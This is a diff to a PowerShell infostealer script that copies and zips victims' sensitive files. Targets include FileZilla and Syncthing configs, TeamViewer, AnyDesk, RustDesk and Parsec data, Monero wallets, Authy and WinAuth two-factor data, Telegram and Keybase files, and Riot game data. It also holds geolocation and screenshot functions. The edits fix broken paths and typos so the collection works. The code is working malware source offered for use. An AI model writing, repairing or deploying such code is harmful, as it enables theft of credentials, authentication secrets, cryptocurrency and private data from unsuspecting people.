@@ -98,13 +98,13 @@ New-Item -Path "$env:tmp/$FolderName/FTPandFileSync" -ItemType Directory
 # FileZilla
 $filezilla = Get-Childitem -Path $env:appdata\FileZilla -Include filezilla.xml -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
 if ($filezilla -ne $null) {
-	Copy-Item "$env:appdata/FTPandFileSync/FileZilla" "$env:tmp/$FolderName" -Recurse
+	Copy-Item "$env:appdata/FileZilla" "$env:tmp/$FolderName/FTPandFileSync/FileZilla" -Recurse
 }
 
 # SyncThing
-if ([System.IO.File]::Exists("$env:appdata/../Syncthing/syncthing.log")) {
+if (Test-Path "$env:appdata/../Local/Syncthing/" -PathType Any) {
 	New-Item -Path $env:tmp/$FolderName/FTPandFileSync/Syncthing -ItemType Directory
-	Copy-Item "$env:appdata/../Syncthing/" "$env:tmp/$FolderName/FTPandFileSync/Syncthing" -Recurse
+	Copy-Item "$env:appdata/../Local/Syncthing" "$env:tmp/$FolderName/FTPandFileSync/Syncthing" -Recurse
 }
 
 Compress-Archive -Path $env:tmp/$FolderName/FTPandFileSync -DestinationPath "$env:tmp/FTPandFileSync-$ZIP"
@@ -129,25 +129,25 @@ Remove-Item "$env:TEMP\FTPandFileSync-$ZIP" -r -Force -ErrorAction SilentlyConti
 New-Item -Path "$env:tmp/$FolderName/RemoteControl" -ItemType Directory
 
 # RustDesk
-if ([System.IO.File]::Exists("$env:appdata\RuskDesk\config")) {
+if (Test-Path "$env:appdata\RuskDesk\config" -PathType Any) {
 	New-Item -Path $env:tmp/$FolderName/RemoteControl/RustDesk -ItemType Directory
 	Copy-Item "$env:appdata/RuskDesk/config" "$env:tmp/$FolderName/RemoteControl/RustDesk/config" -Recurse
 }
 
 # TeamViewer
-if ([System.IO.File]::Exists("$env:appdata\..\TeamViewer\Logs")) {
+if (Test-Path "$env:appdata\..\TeamViewer\Logs" -PathType Any) {
 	New-Item -Path $env:tmp/$FolderName/RemoteControl/TeamViewer -ItemType Directory
 	Copy-Item "$env:appdata/../TeamViewer/Logs" "$env:tmp/$FolderName/RemoteControl/TeamViewer/Logs" -Recurse
 }
 
 # AnyDesk
-if ([System.IO.File]::Exists("$env:appdata\AnyDesk\connection_trace.txt")) {
+if (Test-Path "$env:appdata\AnyDesk\connection_trace.txt" -PathType Any) {
 	New-Item -Path $env:tmp/$FolderName/RemoteControl/AnyDesk -ItemType Directory
 	Copy-Item "$env:appdata/AnyDesk/connection_trace.txt" "$env:tmp/$FolderName/RemoteControl/AnyDesk/connection_trace.txt"
 }
 
 # Parsec
-if ([System.IO.File]::Exists("$env:appdata/Parsec/log.txt")) {
+if (Test-Path"$env:appdata/Parsec/log.txt" -PathType Any) {
 	New-Item -Path $env:tmp/$FolderName/RemoteControl/Parsec -ItemType Directory
 	Copy-Item "$env:appdata/Parsec/log.txt" "$env:tmp/$FolderName/RemoteControl/Parsec/log.txt"
 }
@@ -325,10 +325,11 @@ if (Test-Path $path -PathType Any) {
 }
 
 # Monero
-$path=[Environment]::GetFolderPath("MyDocuments")+"\Monero\wallets"
+$documents=[Environment]::GetFolderPath("MyDocuments")
+$path="$documents\Monero\wallets"
 if (Test-Path $path -PathType Any) {
 	New-Item -Path "$env:tmp/$FolderName/Crypto/Monero" -ItemType Directory
-	Copy-Item [Environment]::GetFolderPath("MyDocuments")+"\Monero\wallets" "$env:tmp/$FolderName/Crypto/Monero" -Recurse
+	Copy-Item "$documents\Monero\wallets" "$env:tmp/$FolderName/Crypto/Monero" -Recurse
 }
 
 Compress-Archive -Path $env:tmp/$FolderName/Crypto -DestinationPath "$env:tmp/Crypto-$ZIP"
@@ -356,19 +357,19 @@ New-Item -Path "$env:tmp/$FolderName/2FA" -ItemType Directory
 $path="$env:appdata\Authy Desktop"
 if (Test-Path $path -PathType Any) {
 	New-Item -Path "$env:tmp/$FolderName/2FA/Authy" -ItemType Directory
-	Copy-Item "$documents\Authy Desktop\Cookies" "$env:tmp/$FolderName/2FA/Authy/Cookies"
-	Copy-Item "$documents\Authy Desktop\Local State" "$env:tmp/$FolderName/2FA/Authy/Local State"
-	Copy-Item "$documents\Authy Desktop\Preferences" "$env:tmp/$FolderName/2FA/Authy/Preferences"
-	Copy-Item "$documents\Authy Desktop\Local Storage\leveldb" "$env:tmp/$FolderName/2FA/Authy/Local Storage/leveldb" -Recurse
-	Copy-Item "$documents\Authy Desktop\Session Storage" "$env:tmp/$FolderName/2FA/Authy/Session Storage" -Recurse
-	Copy-Item "$documents\Authy Desktop\databases" "$env:tmp/$FolderName/2FA/Authy/databases" -Recurse
+	Copy-Item "$env:appdata\Authy Desktop\Cookies" "$env:tmp/$FolderName/2FA/Authy/Cookies"
+	Copy-Item "$env:appdata\Authy Desktop\Local State" "$env:tmp/$FolderName/2FA/Authy/Local State"
+	Copy-Item "$env:appdata\Authy Desktop\Preferences" "$env:tmp/$FolderName/2FA/Authy/Preferences"
+	Copy-Item "$env:appdata\Authy Desktop\Local Storage\leveldb" "$env:tmp/$FolderName/2FA/Authy/Local Storage/leveldb" -Recurse
+	Copy-Item "$env:appdata\Authy Desktop\Session Storage" "$env:tmp/$FolderName/2FA/Authy/Session Storage" -Recurse
+	Copy-Item "$env:appdataAuthy Desktop\databases" "$env:tmp/$FolderName/2FA/Authy/databases" -Recurse
 }
 
 # WinAuth
 $path="$env:appdata\WinAuth"
 if (Test-Path $path -PathType Any) {
 	New-Item -Path "$env:tmp/$FolderName/2FA/WinAuth" -ItemType Directory
-	Copy-Item "$documents\WinAuth" "$env:tmp/$FolderName/2FA/WinAuth" -Recurse
+	Copy-Item "$env:appdata\WinAuth" "$env:tmp/$FolderName/2FA/WinAuth" -Recurse
 }
 
 # RoboForm
@@ -400,13 +401,13 @@ Remove-Item "$env:TEMP\2FA-$ZIP" -r -Force -ErrorAction SilentlyContinue
 New-Item -Path "$env:tmp/$FolderName/Socials" -ItemType Directory
 
 # Telegram
-if ([System.IO.File]::Exists("$env:appdata/Telegram Desktop/log.txt")) {
+if (Test-Path "$env:appdata/Telegram Desktop/log.txt" -PathType Any) {
 	New-Item -Path $env:tmp/$FolderName/Socials/Telegram -ItemType Directory
 	Copy-Item "$env:appdata/Telegram Desktop/log.txt" "$env:tmp\$FolderName\Socials\Telegram\log.txt"
 }
 
 # Keybase
-if ([System.IO.File]::Exists("$env:appdata/../Local/Keybase/config.json")) {
+if (Test-Path "$env:appdata/../Local/Keybase/config.json" -PathType Any) {
 	New-Item -Path $env:tmp/$FolderName/Socials/Keybase -ItemType Directory
 	Copy-Item "$env:appdata/Keybase/config.json" "$env:tmp/$FolderName/Socials/Keybase/config.json"
 }
@@ -489,15 +490,15 @@ if (Test-Path "$env:appdata/../Local/Riot Games/VALORANT" -PathType Any) {
 if (Test-Path "$env:appdata/../Local/VALORANT/Saved/Logs" -PathType Any) {
 Copy-Item "$env:appdata/../Local/VALORANT/Saved/Logs" "$env:tmp/$FolderName/Gaming/Riot Games/Valorant" -Recurse
 }
-if (Test-Path "$env:appdata/../VALORANT/Saved/Config" -PathType Any) {
+if (Test-Path "$env:appdata/../Local/VALORANT/Saved/Config" -PathType Any) {
 Copy-Item "$env:appdata/../Local/VALORANT/Saved/Config" "$env:tmp/$FolderName/Gaming/Riot Games/Valorant" -Recurse
 }
 # RiotClient
 if (Test-Path "$env:appdata\..\Local\Riot Games\Riot Client\Data" -PathType Any) {
-Copy-Item "$env:appdata/../Local/Riot Games/VALORANT/Data" "$env:tmp/$FolderName/Gaming/Riot Games/Riot Client" -Recurse
+Copy-Item "$env:appdata/../Local/Riot Games/Riot Client/Data" "$env:tmp/$FolderName/Gaming/Riot Games/Riot Client" -Recurse
 }
 if (Test-Path "$env:appdata\..\Local\Riot Games\Riot Client\Config" -PathType Any) {
-	Copy-Item "$env:appdata/../Local/Riot Games/VALORANT/Data" "$env:tmp/$FolderName/Gaming/Riot Games/Riot Client" -Recurse
+	Copy-Item "$env:appdata/../Local/Riot Games/Riot Client/Config" "$env:tmp/$FolderName/Gaming/Riot Games/Riot Client" -Recurse
 }
 
 # Minecraft
@@ -625,7 +626,7 @@ function Get-GeoLocation{
 	$GeoWatcher.Start() #Begin resolving current locaton
 
 	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
-		Start-Start-Sleep -Milliseconds 100 #Wait for discovery.
+		Start-Sleep -Milliseconds 100 #Wait for discovery.
 	}  
 
 	if ($GeoWatcher.Permission -eq 'Denied'){
@@ -1481,13 +1482,13 @@ function Get-ScreenCapture
             Where-Object { $_.FormatDescription -eq "JPEG" }
     }
     process {
-        Start-Start-Sleep -Milliseconds 250
+        Start-Sleep -Milliseconds 250
         if ($OfWindow) {
             [Windows.Forms.Sendkeys]::SendWait("%{PrtSc}")
         } else {
             [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")
         }
-        Start-Start-Sleep -Milliseconds 250
+        Start-Sleep -Milliseconds 250
         $bitmap = [Windows.Forms.Clipboard]::GetImage()
         $ep = New-Object Drawing.Imaging.EncoderParameters
         $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)
